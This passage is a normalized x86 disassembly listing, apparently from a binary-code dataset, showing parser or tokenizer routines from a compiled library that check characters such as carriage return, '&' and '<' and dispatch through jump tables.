mov eax [ edx + 0x2c ]
push edi
push eax
push ebx
call sub_1003e150
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push esi
push ebx
call sub_10075cb0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] edi
sete al
test eax eax
jne r-xdata
xor edx edx
cmp eax 0x81
sete dl
mov eax edx
test eax eax
je r-xdata
mov edi esi
call sub_10073f30
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x0
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x6
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0xa
mov eax 0x8
mov ecx ebx
call sub_10073f70
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
add esp 0x4
pop edi
mov eax 0x1
pop esi
mov [ ecx ] 0x6
mov [ edx + 0x34 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax esi
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
mov edi esi
call sub_10073f30
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_10079170
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push 0x8
push ebx
mov [ esi + 0x8 ] 0x2
call sub_10013bb0
add esp 0x8
mov [ esi ] eax
lea ecx [ eax * 4 ]
add eax eax
mov [ esi + 0x8 ] eax
add eax eax
push edi
add eax eax
push eax
push ebx
mov [ ebp - 0x4 ] ecx
call sub_10013bb0
mov edx [ ebp - 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_1007f580
mov ecx [ esi ]
push ecx
push ebx
call sub_1006db40
add esp 0x1c
mov [ esi ] edi
pop edi
mov esp ebp
pop ebp
retn
sub_100791e0
push ebp
mov ebp esp
push esi
push edi
mov edi eax
push edi
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
lea edi [ ebx + 0x94 ]
push edi
call sub_10012bd0
push edi
call sub_1005b7e0
mov ecx [ ebp + 0x8 ]
push edi
mov [ esi + 0x10 ] eax
mov [ esi ] ecx
call sub_100298f0
mov [ esi + 0x18 ] eax
mov ebx [ ebx ]
add esp 0x10
cmp ebx 0x43
ja r-xdata
pop ebx
movzx edx [ ebx + lookup_table_10079314 ]
jmp [ edx * 4 + jump_table_100792e0 ]
pop ebx
pop edi
mov [ esi + 0x1c ] 0x0
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x1
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x2
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x3
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x4
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x5
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x6
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x7
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x8
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x9
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xb
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xc
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0xd
sub_10079321
add eax [ ebx ]
add eax [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x6
pop es
pop es
pop es
or [ eax ] cl
or [ ecx ] al
or [ ecx ] cl
or cl [ ebx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or al 0xcc
int3
sub_10079360
push ebx
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1005dd20
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add edi 0x20
push edi
push esi
call sub_10028ff0
push edi
push esi
call sub_100503f0
add esp 0x24
pop edi
pop ebx
retn
sub_100793a0
push esi
mov esi [ eax + 0x8 ]
push edi
lea ecx [ esi + 0x50 ]
push ecx
lea edi [ esi + 0x94 ]
push edi
call sub_10012bd0
push edi
call sub_1005b7e0
add esp 0xc
pop edi
mov [ esi + 0x48 ] eax
pop esi
retn
sub_100793d0
push ebp
mov ebp esp
mov eax [ esi + 0x8 ]
push ebx
push edi
add eax 0x10
push eax
push esi
call sub_100399a0
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edi [ esi + 0x8 ]
lea edx [ edi + 0x94 ]
push edx
call sub_1005dd20
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add edi 0x20
push edi
push esi
call sub_10028ff0
push edi
push esi
call sub_100503f0
add esp 0x2c
pop edi
pop ebx
pop ebp
retn
sub_10079420
push esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edx [ esi + 0x30 ]
push ebx
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x8 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0xc ] ecx
mov edx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] edx
call sub_1005b7e0
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10012bd0
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
pop ebx
je r-xdata
lea ecx [ esi + 0x94 ]
push ecx
call sub_1000ac10
add esp 0x4
pop esi
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_10079490
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x80 ]
push eax
push esi
call sub_1006db40
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100399a0
mov [ edi + 0x80 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1005dd20
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10028ff0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_100503f0
add ebx 0x20
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add esp 0x34
mov [ edi + 0x8c ] 0x1
pop edi
pop ebx
retn
sub_10079500
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x84 ]
push eax
push esi
call sub_1006db40
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100399a0
mov [ edi + 0x84 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1005dd20
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10028ff0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_100503f0
add ebx 0x20
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add esp 0x34
mov [ edi + 0x90 ] 0x1
pop edi
pop ebx
retn
sub_10079570
push ebp
mov ebp esp
push edi
mov edi eax
lea eax [ esi + 0x1 ]
cmp eax 0x21
ja r-xdata
mov eax 0x5
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079420
pop edi
pop ebp
retn
movzx eax [ eax + lookup_table_10079600 ]
jmp [ eax * 4 + jump_table_100795f0 ]
mov eax 0x4
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079420
pop edi
pop ebp
retn
push r--data
call sub_100386a0
mov eax 0x6
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ edi + 0x18 ] esi
call sub_10079420
pop edi
pop ebp
retn
mov eax 0x7
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_10079420
pop edi
pop ebp
retn
sub_10079604
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ edx ]
add eax [ edx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10079630
push ebx
push edi
mov edi eax
xor ebx ebx
mov [ edi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x7c ]
mov [ edi + 0x18 ] ecx
mov edx [ eax + 0x80 ]
mov [ edi + 0x1c ] edx
mov ecx [ eax + 0x84 ]
mov [ edi + 0x20 ] ecx
mov edx [ eax + 0x88 ]
mov [ edi + 0x24 ] edx
mov ecx [ eax + 0x8c ]
mov [ edi + 0x28 ] ecx
mov edx [ eax + 0x90 ]
mov eax esi
mov [ edi + 0x2c ] edx
call sub_10079420
mov eax [ esi + 0x8 ]
pop edi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
retn
sub_100796a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0x8 ]
add esi 0x3c
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov [ edi ] 0x2
mov edx [ esi + 0x10 ]
xor ebx ebx
mov [ edi + 0x18 ] edx
cmp [ esi + 0x24 ] ebx
jbe r-xdata
mov [ edi ] 0x1
mov eax [ esi + 0x10 ]
mov [ edi + 0x18 ] eax
mov ecx [ esi + 0x20 ]
mov [ edi + 0x1c ] ecx
mov edx [ esi + 0x24 ]
mov [ edi + 0x20 ] edx
mov eax [ esi + 0x28 ]
mov [ edi + 0x24 ] eax
mov ecx [ esi + 0x3c ]
mov [ edi + 0x28 ] ecx
mov eax [ esi + 0x10 ]
push eax
mov [ esi + 0x34 ] eax
call sub_1004bc00
push eax
push r--data
call sub_100386a0
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006db40
mov edx [ esi + 0x10 ]
push edx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
mov ebx [ ebp + 0x8 ]
add esp 0x14
mov eax [ esi + 0x20 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10044040
inc ebx
add esp 0x8
cmp ebx [ esi + 0x24 ]
jb r-xdata
push esi
push ebx
call sub_10028ff0
mov esi [ ebx + 0x8 ]
add esp 0x8
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi + 0x30 ]
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
mov [ edi + 0x8 ] edx
mov eax [ ebx + 0x8 ]
mov [ edi + 0xc ] eax
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] ecx
call sub_1005b7e0
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10012bd0
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
je r-xdata
lea eax [ esi + 0x94 ]
push eax
call sub_1000ac10
add esp 0x4
mov edx [ edi + 0x14 ]
push eax
push edx
push r--data
call sub_100386a0
add esp 0xc
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_100797e0
push esi
mov esi [ ebx + 0x8 ]
push edi
add esi 0x3c
xor edi edi
cmp [ esi + 0x24 ] edi
jbe r-xdata
mov edx [ esi + 0x20 ]
push edx
push ebx
call sub_1006db40
push esi
push ebx
call sub_10028ff0
push r--data
call sub_100386a0
add esp 0x14
pop edi
pop esi
retn
nop
mov eax [ esi + 0x20 ]
mov ecx [ eax + edi * 4 ]
push ecx
push ebx
call sub_10044040
inc edi
add esp 0x8
cmp edi [ esi + 0x24 ]
jb r-xdata
sub_10079830
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov esi eax
mov edi [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
push ecx
lea edx [ edi + 0x94 ]
push edx
push esi
call sub_10056120
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov edi ebx
mov eax esi
mov [ ebx ] 0x5
mov [ ebx + 0x18 ] 0x26
call sub_10079420
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
mov [ edi + 0x4 ] 0x1
push esi
mov esi [ ebp - 0xc ]
mov eax ebx
call sub_10079570
mov ecx [ ebp - 0x8 ]
add esp 0x4
xor eax eax
cmp [ ebp - 0x4 ] eax
mov [ edi + 0xc ] ecx
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
sub_100798b0
push ebx
push edi
mov edi eax
mov [ edi ] 0x3
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100399a0
mov [ edi + 0x18 ] eax
mov ebx [ esi + 0x8 ]
lea eax [ ebx + 0x94 ]
push eax
call sub_1005dd20
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_10028ff0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_100503f0
add ebx 0x20
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add esp 0x2c
mov eax esi
call sub_10079420
pop edi
mov eax 0x1
pop ebx
retn
sub_10079910
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebx + 0x8 ]
lea eax [ esi + 0x94 ]
push edi
push eax
call sub_10047210
mov ecx [ esi + 0x10 ]
mov [ esi + 0x1c ] ecx
mov edi [ ebx + 0x8 ]
mov eax [ edi + 0x1c ]
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
mov [ edi + 0x1c ] ecx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x14 ]
add edx [ edi + 0x10 ]
cmp eax edx
jae r-xdata
mov edx [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
movsx esi [ eax ]
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] edx
call sub_10079570
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax 0x1
add [ edi + 0x1c ] eax
mov [ edi + 0x4 ] ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10079980
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
push ebx
push edi
lea edi [ eax + 0x3c ]
add eax 0x94
push eax
call sub_100298f0
lea ecx [ eax - 0x41 ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp ecx 0x19
ja r-xdata
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_100503f0
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ ebx + 0x94 ]
push eax
call sub_1005b7e0
mov edx [ ebp - 0x4 ]
push edi
push edx
push esi
mov [ ebx + 0x48 ] eax
call sub_1005ada0
lea eax [ edi + 0x20 ]
push eax
push 0x4
push esi
call sub_100417e0
mov ecx [ ebp + 0x8 ]
xor eax eax
push r--data
mov [ edi + 0x2c ] eax
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] eax
call sub_100386a0
add esp 0x30
pop edi
pop ebx
mov esp ebp
pop ebp
retn
add eax 0x20
mov [ ebp - 0x4 ] eax
sub_10079a20
push ebx
push edi
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push esi
call sub_100399a0
mov ebx eax
push ebx
call sub_10008350
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_1006db40
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_100503f0
mov edi [ esi + 0x8 ]
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
push ebx
push esi
mov [ edi + 0x48 ] eax
call sub_1006db40
add esp 0x30
pop edi
pop ebx
retn
sub_10079a90
push ebp
mov ebp esp
push esi
mov esi eax
push edi
push esi
call sub_10058470
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov [ edi ] 0x18
mov ecx [ eax + 0x50 ]
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x54 ]
mov [ edi + 0x8 ] edx
mov ecx [ eax + 0x58 ]
mov [ edi + 0xc ] ecx
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + 0x1c ] eax
mov [ edi + 0x10 ] edx
mov [ edi + 0x20 ] ecx
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_100399a0
mov [ edi + 0x18 ] eax
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_1006db40
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_100503f0
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10012bd0
push edi
call sub_1005b7e0
add esp 0x24
mov [ esi + 0x48 ] eax
sub_10079b20
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
xor edx edx
lea eax [ ebx + 0x5c ]
mov [ ebx + 0x68 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ecx
cmp ecx edx
jbe r-xdata
push 0x4c
push edi
call sub_10013bb0
mov esi eax
mov [ esi ] 0x0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_100399a0
mov [ esi + 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1005b7e0
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ esi + 0xc ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
nop
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10012bd0
push r--data
push edi
call sub_1004ab70
mov [ esi + 0x10 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x14 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_1005b7e0
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
dec eax
mov [ esi + 0xc ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebx + 0x40 ]
sub eax edx
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10012bd0
mov eax [ ebp - 0x10 ]
push eax
push esi
push edi
call sub_10006860
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
push edi
call sub_1006db40
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_100503f0
mov edi [ edi + 0x8 ]
lea ecx [ edi + 0x50 ]
push ecx
lea esi [ edi + 0x94 ]
push esi
call sub_10012bd0
push esi
call sub_1005b7e0
add esp 0x30
mov [ edi + 0x48 ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax ecx
mov ecx [ ebx + 0x3c ]
cmp eax 0x4
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov esi [ eax + 0x4 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
push ecx
push edx
mov eax edi
call sub_10079a90
add esp 0x8
pop edi
pop esi
mov [ ebx + 0x68 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
cmp eax 0x1
jbe r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
je r-xdata
sub_10079d20
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x68 ] 0x0
push edi
je r-xdata
mov ecx [ eax + 0x60 ]
mov edx [ eax + 0x5c ]
mov edi [ edx + ecx * 4 - 0x4 ]
mov eax [ edi + 0x10 ]
push ebx
push eax
push esi
call sub_1006db40
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_100399a0
mov [ edi + 0x10 ] eax
mov ebx [ esi + 0x8 ]
mov ecx [ ebx + 0x48 ]
lea eax [ ebx + 0x94 ]
push eax
mov [ edi + 0x14 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1005b7e0
sub eax [ ebx + 0x48 ]
mov edx [ edi + 0x14 ]
add esp 0x14
mov [ edi + 0x18 ] eax
cmp [ edx + eax - 0x1 ] 0xd
jne r-xdata
mov [ eax + 0x68 ] 0x0
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_1006db40
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_100503f0
mov esi [ esi + 0x8 ]
lea eax [ esi + 0x50 ]
push eax
lea edi [ esi + 0x94 ]
push edi
call sub_10012bd0
push edi
call sub_1005b7e0
add esp 0x1c
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x50 ]
mov [ edi + 0x34 ] ecx
mov edx [ ebx + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x38 ] edx
mov eax [ ebx + 0x58 ]
mov [ edi + 0x3c ] eax
add edi 0x40
push edi
push ecx
call sub_10012bd0
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_1006db40
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_100503f0
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10012bd0
push edi
call sub_1005b7e0
add esp 0x24
pop ebx
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
dec eax
mov [ edi + 0x18 ] eax
sub_10079e30
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
call sub_10079570
add esp 0x8
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x26
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x7
call sub_10079360
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10079f00
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10079fec ]
jmp [ eax * 4 + jump_table_10079fd8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x3
pop edi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xa
call sub_10079360
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1005ada0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079420
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10079ff1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007a050
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079420
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xd
call sub_10079360
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1005ada0
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a110
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079420
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
